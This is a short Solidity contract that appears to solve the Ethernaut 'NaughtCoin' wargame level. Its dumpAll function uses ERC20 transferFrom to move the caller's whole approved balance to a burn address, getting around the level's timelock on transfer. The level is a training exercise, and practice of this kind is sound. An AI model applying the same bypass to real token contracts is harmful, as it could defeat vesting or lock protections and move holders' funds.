// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IERC20{
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract EthernautNaughtCoin {
    IERC20 _token;
    
    constructor(address token) {
        _token = IERC20(token);
    }

    function dumpAll() public {
        IERC20 token = _token;
        token.transferFrom(msg.sender, address(0xdead), token.balanceOf(msg.sender));
    }
}